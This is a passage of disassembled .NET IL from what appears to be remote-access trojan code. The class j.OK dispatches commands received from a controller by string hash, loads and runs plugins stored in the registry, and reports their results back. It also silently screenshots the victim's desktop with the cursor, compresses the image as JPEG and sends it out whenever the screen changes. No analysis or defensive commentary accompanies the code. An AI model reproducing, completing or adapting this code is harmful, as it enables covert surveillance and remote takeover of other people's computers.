      IL_067a:  ldsfld     string j.OK::P
      IL_067f:  stelem.ref
      IL_0680:  ldnull
      IL_0681:  ldnull
      IL_0682:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_0687:  ldloc.s    V_18
      IL_0689:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_068e:  ldnull
      IL_068f:  ldstr      "osk"
      IL_0694:  ldc.i4.1
      IL_0695:  newarr     [mscorlib]System.Object
      IL_069a:  dup
      IL_069b:  ldc.i4.0
      IL_069c:  ldloc.0
      IL_069d:  ldc.i4.2
      IL_069e:  ldelem.ref
      IL_069f:  stelem.ref
      IL_06a0:  ldnull
      IL_06a1:  ldnull
      IL_06a2:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_06a7:  ldloc.s    V_18
      IL_06a9:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_06ae:  ldnull
      IL_06af:  ldstr      "start"
      IL_06b4:  ldc.i4.0
      IL_06b5:  newarr     [mscorlib]System.Object
      IL_06ba:  ldnull
      IL_06bb:  ldnull
      IL_06bc:  ldnull
      IL_06bd:  ldc.i4.1
      IL_06be:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                         class [mscorlib]System.Type,
                                                                                                                         string,
                                                                                                                         object[],
                                                                                                                         string[],
                                                                                                                         class [mscorlib]System.Type[],
                                                                                                                         bool[],
                                                                                                                         bool)
      IL_06c3:  pop
      IL_06c4:  br.s       IL_06cc

      IL_06c6:  ldc.i4.1
      IL_06c7:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
      IL_06cc:  ldsfld     bool j.OK::Cn
      IL_06d1:  ldc.i4.0
      IL_06d2:  ceq
      IL_06d4:  box        [mscorlib]System.Boolean
      IL_06d9:  ldloc.s    V_18
      IL_06db:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_06e0:  ldnull
      IL_06e1:  ldstr      "Off"
      IL_06e6:  ldc.i4.0
      IL_06e7:  newarr     [mscorlib]System.Object
      IL_06ec:  ldnull
      IL_06ed:  ldnull
      IL_06ee:  ldnull
      IL_06ef:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateGet(object,
                                                                                                                        class [mscorlib]System.Type,
                                                                                                                        string,
                                                                                                                        object[],
                                                                                                                        string[],
                                                                                                                        class [mscorlib]System.Type[],
                                                                                                                        bool[])
      IL_06f4:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_06f9:  ldc.i4.1
      IL_06fa:  box        [mscorlib]System.Boolean
      IL_06ff:  ldc.i4.0
      IL_0700:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareObjectEqual(object,
                                                                                                                              object,
                                                                                                                              bool)
      IL_0705:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_070a:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::OrObject(object,
                                                                                                                    object)
      IL_070f:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0714:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
      IL_0719:  brfalse.s  IL_06c6

      IL_071b:  ldloc.s    V_18
      IL_071d:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0722:  ldnull
      IL_0723:  ldstr      "off"
      IL_0728:  ldc.i4.1
      IL_0729:  newarr     [mscorlib]System.Object
      IL_072e:  dup
      IL_072f:  ldc.i4.0
      IL_0730:  ldc.i4.1
      IL_0731:  box        [mscorlib]System.Boolean
      IL_0736:  stelem.ref
      IL_0737:  ldnull
      IL_0738:  ldnull
      IL_0739:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_073e:  leave      IL_2a86

      IL_0743:  ldloc.0
      IL_0744:  ldc.i4.1
      IL_0745:  ldelem.ref
      IL_0746:  ldc.i4.0
      IL_0747:  newarr     [mscorlib]System.Byte
      IL_074c:  call       object j.OK::GTV(string,
                                            object)
      IL_0751:  castclass  uint8[]
      IL_0756:  stloc.s    V_21
      IL_0758:  ldloc.0
      IL_0759:  ldc.i4.2
      IL_075a:  ldelem.ref
      IL_075b:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_0760:  ldc.i4.s   10
      IL_0762:  clt
      IL_0764:  ldloc.s    V_21
      IL_0766:  ldlen
      IL_0767:  conv.i4
      IL_0768:  ldc.i4.0
      IL_0769:  ceq
      IL_076b:  and
      IL_076c:  brfalse.s  IL_07ab

      IL_076e:  ldc.i4.5
      IL_076f:  newarr     [mscorlib]System.String
      IL_0774:  dup
      IL_0775:  ldc.i4.0
      IL_0776:  ldstr      "pl"
      IL_077b:  stelem.ref
      IL_077c:  dup
      IL_077d:  ldc.i4.1
      IL_077e:  ldsfld     string j.OK::Y
      IL_0783:  stelem.ref
      IL_0784:  dup
      IL_0785:  ldc.i4.2
      IL_0786:  ldloc.0
      IL_0787:  ldc.i4.1
      IL_0788:  ldelem.ref
      IL_0789:  stelem.ref
      IL_078a:  dup
      IL_078b:  ldc.i4.3
      IL_078c:  ldsfld     string j.OK::Y
      IL_0791:  stelem.ref
      IL_0792:  dup
      IL_0793:  ldc.i4.4
      IL_0794:  ldc.i4.1
      IL_0795:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
      IL_079a:  stelem.ref
      IL_079b:  call       string [mscorlib]System.String::Concat(string[])
      IL_07a0:  call       bool j.OK::Send(string)
      IL_07a5:  pop
      IL_07a6:  br         IL_08af

      IL_07ab:  ldloc.0
      IL_07ac:  ldc.i4.2
      IL_07ad:  ldelem.ref
      IL_07ae:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_07b3:  ldc.i4.s   10
      IL_07b5:  ble.s      IL_07ff

      IL_07b7:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
      IL_07bc:  ldloc.0
      IL_07bd:  ldc.i4.0
      IL_07be:  ldelem.ref
      IL_07bf:  ldsfld     string j.OK::Y
      IL_07c4:  ldloc.0
      IL_07c5:  ldc.i4.1
      IL_07c6:  ldelem.ref
      IL_07c7:  ldsfld     string j.OK::Y
      IL_07cc:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_07d1:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_07d6:  stloc.s    V_23
      IL_07d8:  dup
      IL_07d9:  ldarg.0
      IL_07da:  ldloc.s    V_23
      IL_07dc:  ldarg.0
      IL_07dd:  ldlen
      IL_07de:  conv.i4
      IL_07df:  ldloc.s    V_23
      IL_07e1:  sub.ovf
      IL_07e2:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                 int32,
                                                                                 int32)
      IL_07e7:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_07ec:  call       uint8[] j.OK::ZIP(uint8[])
      IL_07f1:  stloc.s    V_21
      IL_07f3:  ldloc.0
      IL_07f4:  ldc.i4.1
      IL_07f5:  ldelem.ref
      IL_07f6:  ldloc.s    V_21
      IL_07f8:  ldc.i4.3
      IL_07f9:  call       bool j.OK::STV(string,
                                          object,
                                          valuetype [mscorlib]Microsoft.Win32.RegistryValueKind)
      IL_07fe:  pop
      IL_07ff:  ldc.i4.5
      IL_0800:  newarr     [mscorlib]System.String
      IL_0805:  dup
      IL_0806:  ldc.i4.0
      IL_0807:  ldstr      "pl"
      IL_080c:  stelem.ref
      IL_080d:  dup
      IL_080e:  ldc.i4.1
      IL_080f:  ldsfld     string j.OK::Y
      IL_0814:  stelem.ref
      IL_0815:  dup
      IL_0816:  ldc.i4.2
      IL_0817:  ldloc.0
      IL_0818:  ldc.i4.1
      IL_0819:  ldelem.ref
      IL_081a:  stelem.ref
      IL_081b:  dup
      IL_081c:  ldc.i4.3
      IL_081d:  ldsfld     string j.OK::Y
      IL_0822:  stelem.ref
      IL_0823:  dup
      IL_0824:  ldc.i4.4
      IL_0825:  ldc.i4.0
      IL_0826:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
      IL_082b:  stelem.ref
      IL_082c:  call       string [mscorlib]System.String::Concat(string[])
      IL_0831:  call       bool j.OK::Send(string)
      IL_0836:  pop
      IL_0837:  ldloc.s    V_21
      IL_0839:  ldstr      "A"
      IL_083e:  call       object j.OK::Plugin(uint8[],
                                               string)
      IL_0843:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0848:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_084d:  stloc.s    V_22
      IL_084f:  ldc.i4.5
      IL_0850:  newarr     [mscorlib]System.String
      IL_0855:  dup
      IL_0856:  ldc.i4.0
      IL_0857:  ldstr      "ret"
      IL_085c:  stelem.ref
      IL_085d:  dup
      IL_085e:  ldc.i4.1
      IL_085f:  ldsfld     string j.OK::Y
      IL_0864:  stelem.ref
      IL_0865:  dup
      IL_0866:  ldc.i4.2
      IL_0867:  ldloc.0
      IL_0868:  ldc.i4.1
      IL_0869:  ldelem.ref
      IL_086a:  stelem.ref
      IL_086b:  dup
      IL_086c:  ldc.i4.3
      IL_086d:  ldsfld     string j.OK::Y
      IL_0872:  stelem.ref
      IL_0873:  dup
      IL_0874:  ldc.i4.4
      IL_0875:  ldloc.s    V_22
      IL_0877:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_087c:  ldnull
      IL_087d:  ldstr      "GT"
      IL_0882:  ldc.i4.0
      IL_0883:  newarr     [mscorlib]System.Object
      IL_0888:  ldnull
      IL_0889:  ldnull
      IL_088a:  ldnull
      IL_088b:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateGet(object,
                                                                                                                        class [mscorlib]System.Type,
                                                                                                                        string,
                                                                                                                        object[],
                                                                                                                        string[],
                                                                                                                        class [mscorlib]System.Type[],
                                                                                                                        bool[])
      IL_0890:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0895:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
      IL_089a:  stloc.s    V_24
      IL_089c:  ldloca.s   V_24
      IL_089e:  call       string j.OK::ENB(string&)
      IL_08a3:  stelem.ref
      IL_08a4:  call       string [mscorlib]System.String::Concat(string[])
      IL_08a9:  call       bool j.OK::Send(string)
      IL_08ae:  pop
      IL_08af:  leave      IL_2a86

      IL_08b4:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_08b9:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_08be:  stloc.s    V_25
      IL_08c0:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_08c5:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_08ca:  stloc.s    V_33
      IL_08cc:  ldloca.s   V_33
      IL_08ce:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Width()
      IL_08d3:  ldloca.s   V_25
      IL_08d5:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Height()
      IL_08da:  ldc.i4     0x21005
      IL_08df:  newobj     instance void [System.Drawing]System.Drawing.Bitmap::.ctor(int32,
                                                                                      int32,
                                                                                      valuetype [System.Drawing]System.Drawing.Imaging.PixelFormat)
      IL_08e4:  stloc.s    V_26
      IL_08e6:  ldloc.s    V_26
      IL_08e8:  call       class [System.Drawing]System.Drawing.Graphics [System.Drawing]System.Drawing.Graphics::FromImage(class [System.Drawing]System.Drawing.Image)
      IL_08ed:  stloc.s    V_27
      IL_08ef:  ldloc.s    V_26
      IL_08f1:  callvirt   instance int32 [System.Drawing]System.Drawing.Image::get_Width()
      IL_08f6:  ldloc.s    V_26
      IL_08f8:  callvirt   instance int32 [System.Drawing]System.Drawing.Image::get_Height()
      IL_08fd:  newobj     instance void [System.Drawing]System.Drawing.Size::.ctor(int32,
                                                                                    int32)
      IL_0902:  stloc.s    V_28
      IL_0904:  ldloc.s    V_27
      IL_0906:  ldc.i4.0
      IL_0907:  ldc.i4.0
      IL_0908:  ldc.i4.0
      IL_0909:  ldc.i4.0
      IL_090a:  ldloc.s    V_28
      IL_090c:  ldc.i4     0xcc0020
      IL_0911:  callvirt   instance void [System.Drawing]System.Drawing.Graphics::CopyFromScreen(int32,
                                                                                                 int32,
                                                                                                 int32,
                                                                                                 int32,
                                                                                                 valuetype [System.Drawing]System.Drawing.Size,
                                                                                                 valuetype [System.Drawing]System.Drawing.CopyPixelOperation)
      .try
      {
        IL_0916:  ldc.i4.s   32
        IL_0918:  ldc.i4.s   32
        IL_091a:  newobj     instance void [System.Drawing]System.Drawing.Size::.ctor(int32,
                                                                                      int32)
        IL_091f:  stloc.s    V_28
        IL_0921:  call       valuetype [System.Drawing]System.Drawing.Point [System.Windows.Forms]System.Windows.Forms.Cursor::get_Position()
        IL_0926:  ldloc.s    V_28
        IL_0928:  newobj     instance void [System.Drawing]System.Drawing.Rectangle::.ctor(valuetype [System.Drawing]System.Drawing.Point,
                                                                                           valuetype [System.Drawing]System.Drawing.Size)
        IL_092d:  stloc.s    V_25
        IL_092f:  call       class [System.Windows.Forms]System.Windows.Forms.Cursor [System.Windows.Forms]System.Windows.Forms.Cursors::get_Default()
        IL_0934:  ldloc.s    V_27
        IL_0936:  ldloc.s    V_25
        IL_0938:  callvirt   instance void [System.Windows.Forms]System.Windows.Forms.Cursor::Draw(class [System.Drawing]System.Drawing.Graphics,
                                                                                                   valuetype [System.Drawing]System.Drawing.Rectangle)
        IL_093d:  leave.s    IL_095a

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_093f:  dup
        IL_0940:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0945:  stloc.s    V_34
        IL_0947:  ldloc.s    V_34
        IL_0949:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_094e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0953:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0958:  leave.s    IL_095a

      }  // end handler
      IL_095a:  ldloc.s    V_27
      IL_095c:  callvirt   instance void [System.Drawing]System.Drawing.Graphics::Dispose()
      IL_0961:  ldloc.0
      IL_0962:  ldc.i4.1
      IL_0963:  ldelem.ref
      IL_0964:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
      IL_0969:  ldloc.0
      IL_096a:  ldc.i4.2
      IL_096b:  ldelem.ref
      IL_096c:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
      IL_0971:  newobj     instance void [System.Drawing]System.Drawing.Bitmap::.ctor(int32,
                                                                                      int32)
      IL_0976:  stloc.s    V_29
      IL_0978:  ldloc.s    V_29
      IL_097a:  call       class [System.Drawing]System.Drawing.Graphics [System.Drawing]System.Drawing.Graphics::FromImage(class [System.Drawing]System.Drawing.Image)
      IL_097f:  stloc.s    V_27
      IL_0981:  ldloc.s    V_27
      IL_0983:  ldloc.s    V_26
      IL_0985:  ldc.i4.0
      IL_0986:  ldc.i4.0
      IL_0987:  ldloc.s    V_29
      IL_0989:  callvirt   instance int32 [System.Drawing]System.Drawing.Image::get_Width()
      IL_098e:  ldloc.s    V_29
      IL_0990:  callvirt   instance int32 [System.Drawing]System.Drawing.Image::get_Height()
      IL_0995:  callvirt   instance void [System.Drawing]System.Drawing.Graphics::DrawImage(class [System.Drawing]System.Drawing.Image,
                                                                                            int32,
                                                                                            int32,
                                                                                            int32,
                                                                                            int32)
      IL_099a:  ldloc.s    V_27
      IL_099c:  callvirt   instance void [System.Drawing]System.Drawing.Graphics::Dispose()
      IL_09a1:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
      IL_09a6:  stloc.s    V_30
      IL_09a8:  ldstr      "CAP"
      IL_09ad:  ldsfld     string j.OK::Y
      IL_09b2:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_09b7:  stloc.s    V_24
      IL_09b9:  ldloca.s   V_24
      IL_09bb:  call       uint8[] j.OK::SB(string&)
      IL_09c0:  starg.s    b
      IL_09c2:  ldloc.s    V_30
      IL_09c4:  ldarg.0
      IL_09c5:  ldc.i4.0
      IL_09c6:  ldarg.0
      IL_09c7:  ldlen
      IL_09c8:  conv.i4
      IL_09c9:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                 int32,
                                                                                 int32)
      IL_09ce:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
      IL_09d3:  stloc.s    V_31
      IL_09d5:  ldloc.s    V_29
      IL_09d7:  ldloc.s    V_31
      IL_09d9:  call       class [System.Drawing]System.Drawing.Imaging.ImageFormat [System.Drawing]System.Drawing.Imaging.ImageFormat::get_Jpeg()
      IL_09de:  callvirt   instance void [System.Drawing]System.Drawing.Image::Save(class [mscorlib]System.IO.Stream,
                                                                                    class [System.Drawing]System.Drawing.Imaging.ImageFormat)
      IL_09e3:  ldloc.s    V_31
      IL_09e5:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_09ea:  call       string j.OK::md5(uint8[])
      IL_09ef:  stloc.s    V_32
      IL_09f1:  ldloc.s    V_32
      IL_09f3:  ldsfld     string j.OK::lastcap
      IL_09f8:  ldc.i4.0
      IL_09f9:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_09fe:  brfalse.s  IL_0a20

      IL_0a00:  ldloc.s    V_32
      IL_0a02:  stsfld     string j.OK::lastcap
      IL_0a07:  ldloc.s    V_30
      IL_0a09:  ldloc.s    V_31
      IL_0a0b:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_0a10:  ldc.i4.0
      IL_0a11:  ldloc.s    V_31
      IL_0a13:  callvirt   instance int64 [mscorlib]System.IO.MemoryStream::get_Length()
      IL_0a18:  conv.ovf.i4
      IL_0a19:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                 int32,
                                                                                 int32)
      IL_0a1e:  br.s       IL_0a28

      IL_0a20:  ldloc.s    V_30
      IL_0a22:  ldc.i4.0
      IL_0a23:  callvirt   instance void [mscorlib]System.IO.MemoryStream::WriteByte(uint8)
      IL_0a28:  ldloc.s    V_30
      IL_0a2a:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_0a2f:  call       bool j.OK::Sendb(uint8[])
      IL_0a34:  pop
      IL_0a35:  ldloc.s    V_30
      IL_0a37:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
      IL_0a3c:  ldloc.s    V_31
      IL_0a3e:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
      IL_0a43:  ldloc.s    V_26
      IL_0a45:  callvirt   instance void [System.Drawing]System.Drawing.Image::Dispose()
      IL_0a4a:  ldloc.s    V_29
      IL_0a4c:  callvirt   instance void [System.Drawing]System.Drawing.Image::Dispose()
      IL_0a51:  br         IL_2670

      IL_0a56:  ldloc.0
      IL_0a57:  ldc.i4.1
      IL_0a58:  ldelem.ref
      IL_0a59:  stloc.s    V_24
      IL_0a5b:  ldloc.s    V_24
      IL_0a5d:  call       uint32 '<PrivateImplementationDetails>'::ComputeStringHash(string)
      IL_0a62:  stloc.s    V_8
      IL_0a64:  ldloc.s    V_8
      IL_0a66:  ldc.i4     0x708a0932
      IL_0a6b:  bgt.un     IL_0d30

      IL_0a70:  ldloc.s    V_8
      IL_0a72:  ldc.i4     0x444aebb3
      IL_0a77:  bgt.un     IL_0bd6

      IL_0a7c:  ldloc.s    V_8
      IL_0a7e:  ldc.i4     0x240c8dec
      IL_0a83:  bgt.un     IL_0b2f

      IL_0a88:  ldloc.s    V_8
      IL_0a8a:  ldc.i4     0x11d82b17
      IL_0a8f:  bgt.un.s   IL_0ae0

      IL_0a91:  ldloc.s    V_8
      IL_0a93:  ldc.i4     0x5a2e205
      IL_0a98:  bgt.un.s   IL_0ab7

      IL_0a9a:  ldloc.s    V_8
      IL_0a9c:  ldc.i4     0x419632c
      IL_0aa1:  beq        IL_1435

      IL_0aa6:  ldloc.s    V_8
      IL_0aa8:  ldc.i4     0x5a2e205
      IL_0aad:  beq        IL_1321

      IL_0ab2:  br         IL_266b

      IL_0ab7:  ldloc.s    V_8
      IL_0ab9:  ldc.i4     0xc0ca3d1
      IL_0abe:  beq        IL_1463

      IL_0ac3:  ldloc.s    V_8
      IL_0ac5:  ldc.i4     0xc107568
      IL_0aca:  beq        IL_1491

      IL_0acf:  ldloc.s    V_8
      IL_0ad1:  ldc.i4     0x11d82b17
      IL_0ad6:  beq        IL_12dc

      IL_0adb:  br         IL_266b

      IL_0ae0:  ldloc.s    V_8
      IL_0ae2:  ldc.i4     0x141df98a
      IL_0ae7:  bgt.un.s   IL_0b06

      IL_0ae9:  ldloc.s    V_8
      IL_0aeb:  ldc.i4     0x1412c097
      IL_0af0:  beq        IL_144c

      IL_0af5:  ldloc.s    V_8
      IL_0af7:  ldc.i4     0x141df98a
      IL_0afc:  beq        IL_14bf

      IL_0b01:  br         IL_266b

      IL_0b06:  ldloc.s    V_8
      IL_0b08:  ldc.i4     0x1c986f86
      IL_0b0d:  beq        IL_1577

      IL_0b12:  ldloc.s    V_8
      IL_0b14:  ldc.i4     0x1e743595
      IL_0b19:  beq        IL_137d

      IL_0b1e:  ldloc.s    V_8
      IL_0b20:  ldc.i4     0x240c8dec
      IL_0b25:  beq        IL_0ffc

      IL_0b2a:  br         IL_266b

      IL_0b2f:  ldloc.s    V_8
      IL_0b31:  ldc.i4     0x2f691229
      IL_0b36:  bgt.un.s   IL_0b87

      IL_0b38:  ldloc.s    V_8
      IL_0b3a:  ldc.i4     0x27ba4b2c
      IL_0b3f:  bgt.un.s   IL_0b5e

      IL_0b41:  ldloc.s    V_8
      IL_0b43:  ldc.i4     0x249abab5
      IL_0b48:  beq        IL_15d3

      IL_0b4d:  ldloc.s    V_8
      IL_0b4f:  ldc.i4     0x27ba4b2c
      IL_0b54:  beq        IL_116c

      IL_0b59:  br         IL_266b

      IL_0b5e:  ldloc.s    V_8
      IL_0b60:  ldc.i4     0x2c940b88
      IL_0b65:  beq        IL_1532

      IL_0b6a:  ldloc.s    V_8
      IL_0b6c:  ldc.i4     0x2ca0d77b
      IL_0b71:  beq        IL_1504

      IL_0b76:  ldloc.s    V_8
      IL_0b78:  ldc.i4     0x2f691229
      IL_0b7d:  beq        IL_130a

      IL_0b82:  br         IL_266b

      IL_0b87:  ldloc.s    V_8
      IL_0b89:  ldc.i4     0x3259141b
      IL_0b8e:  bgt.un.s   IL_0bad

      IL_0b90:  ldloc.s    V_8
      IL_0b92:  ldc.i4     0x2fc941c2
      IL_0b97:  beq        IL_11c8

      IL_0b9c:  ldloc.s    V_8
      IL_0b9e:  ldc.i4     0x3259141b
      IL_0ba3:  beq        IL_1280

      IL_0ba8:  br         IL_266b

      IL_0bad:  ldloc.s    V_8
      IL_0baf:  ldc.i4     0x349656b7
      IL_0bb4:  beq        IL_15a5

      IL_0bb9:  ldloc.s    V_8
      IL_0bbb:  ldc.i4     0x3b036886
      IL_0bc0:  beq        IL_11b1

      IL_0bc5:  ldloc.s    V_8
      IL_0bc7:  ldc.i4     0x444aebb3
      IL_0bcc:  beq        IL_1297

      IL_0bd1:  br         IL_266b

      IL_0bd6:  ldloc.s    V_8
      IL_0bd8:  ldc.i4     0x6a3d86c9
      IL_0bdd:  bgt.un     IL_0c89

      IL_0be2:  ldloc.s    V_8
      IL_0be4:  ldc.i4     0x5b028992
      IL_0be9:  bgt.un.s   IL_0c3a

      IL_0beb:  ldloc.s    V_8
      IL_0bed:  ldc.i4     0x4d218216
      IL_0bf2:  bgt.un.s   IL_0c11

      IL_0bf4:  ldloc.s    V_8
      IL_0bf6:  ldc.i4     0x4a56fc7b
      IL_0bfb:  beq        IL_1183

      IL_0c00:  ldloc.s    V_8
      IL_0c02:  ldc.i4     0x4d218216
      IL_0c07:  beq        IL_1110

      IL_0c0c:  br         IL_266b

      IL_0c11:  ldloc.s    V_8
      IL_0c13:  ldc.i4     0x507354d8
      IL_0c18:  beq        IL_134f

      IL_0c1d:  ldloc.s    V_8
      IL_0c1f:  ldc.i4     0x56661f55
      IL_0c24:  beq        IL_119a

      IL_0c29:  ldloc.s    V_8
      IL_0c2b:  ldc.i4     0x5b028992
      IL_0c30:  beq        IL_10f9

      IL_0c35:  br         IL_266b

      IL_0c3a:  ldloc.s    V_8
      IL_0c3c:  ldc.i4     0x5f13d8ff
      IL_0c41:  bgt.un.s   IL_0c60

      IL_0c43:  ldloc.s    V_8
      IL_0c45:  ldc.i4     0x5c224973
      IL_0c4a:  beq        IL_12c5

      IL_0c4f:  ldloc.s    V_8
      IL_0c51:  ldc.i4     0x5f13d8ff
      IL_0c56:  beq        IL_109d

      IL_0c5b:  br         IL_266b

      IL_0c60:  ldloc.s    V_8
      IL_0c62:  ldc.i4     0x67bc623c
      IL_0c67:  beq        IL_123b

      IL_0c6c:  ldloc.s    V_8
      IL_0c6e:  ldc.i4     0x69454f5d
      IL_0c73:  beq        IL_1252

      IL_0c78:  ldloc.s    V_8
      IL_0c7a:  ldc.i4     0x6a3d86c9
      IL_0c7f:  beq        IL_1618

      IL_0c84:  br         IL_266b

      IL_0c89:  ldloc.s    V_8
      IL_0c8b:  ldc.i4     0x6c8a02e6
      IL_0c90:  bgt.un.s   IL_0ce1

      IL_0c92:  ldloc.s    V_8
      IL_0c94:  ldc.i4     0x6a4c9153
      IL_0c99:  bgt.un.s   IL_0cb8

      IL_0c9b:  ldloc.s    V_8
      IL_0c9d:  ldc.i4     0x6a47ab9a
      IL_0ca2:  beq        IL_1269

      IL_0ca7:  ldloc.s    V_8
      IL_0ca9:  ldc.i4     0x6a4c9153
      IL_0cae:  beq        IL_1646

      IL_0cb3:  br         IL_266b

      IL_0cb8:  ldloc.s    V_8
      IL_0cba:  ldc.i4     0x6a89ffc0
      IL_0cbf:  beq        IL_162f

      IL_0cc4:  ldloc.s    V_8
      IL_0cc6:  ldc.i4     0x6b02a2c2
      IL_0ccb:  beq        IL_10cb

      IL_0cd0:  ldloc.s    V_8
      IL_0cd2:  ldc.i4     0x6c8a02e6
      IL_0cd7:  beq        IL_16fe

      IL_0cdc:  br         IL_266b

      IL_0ce1:  ldloc.s    V_8
      IL_0ce3:  ldc.i4     0x6d8a0479
      IL_0ce8:  bgt.un.s   IL_0d07

      IL_0cea:  ldloc.s    V_8
      IL_0cec:  ldc.i4     0x6ceb4c99
      IL_0cf1:  beq        IL_10b4

      IL_0cf6:  ldloc.s    V_8
      IL_0cf8:  ldc.i4     0x6d8a0479
      IL_0cfd:  beq        IL_1601

      IL_0d02:  br         IL_266b

      IL_0d07:  ldloc.s    V_8
      IL_0d09:  ldc.i4     0x6e8a060c
      IL_0d0e:  beq        IL_16a2

      IL_0d13:  ldloc.s    V_8
      IL_0d15:  ldc.i4     0x6f8a079f
      IL_0d1a:  beq        IL_16d0

      IL_0d1f:  ldloc.s    V_8
      IL_0d21:  ldc.i4     0x708a0932
      IL_0d26:  beq        IL_165d

      IL_0d2b:  br         IL_266b

      IL_0d30:  ldloc.s    V_8
      IL_0d32:  ldc.i4     0x8a3461c8
      IL_0d37:  bgt.un     IL_0e96

      IL_0d3c:  ldloc.s    V_8
      IL_0d3e:  ldc.i4     0x7e931998
      IL_0d43:  bgt.un     IL_0def

      IL_0d48:  ldloc.s    V_8
      IL_0d4a:  ldc.i4     0x7930d042
      IL_0d4f:  bgt.un.s   IL_0da0

      IL_0d51:  ldloc.s    V_8
      IL_0d53:  ldc.i4     0x7242108f
      IL_0d58:  bgt.un.s   IL_0d77

      IL_0d5a:  ldloc.s    V_8
      IL_0d5c:  ldc.i4     0x718a0ac5
      IL_0d61:  beq        IL_168b

      IL_0d66:  ldloc.s    V_8
      IL_0d68:  ldc.i4     0x7242108f
      IL_0d6d:  beq        IL_16e7

      IL_0d72:  br         IL_266b

      IL_0d77:  ldloc.s    V_8
      IL_0d79:  ldc.i4     0x724edc82
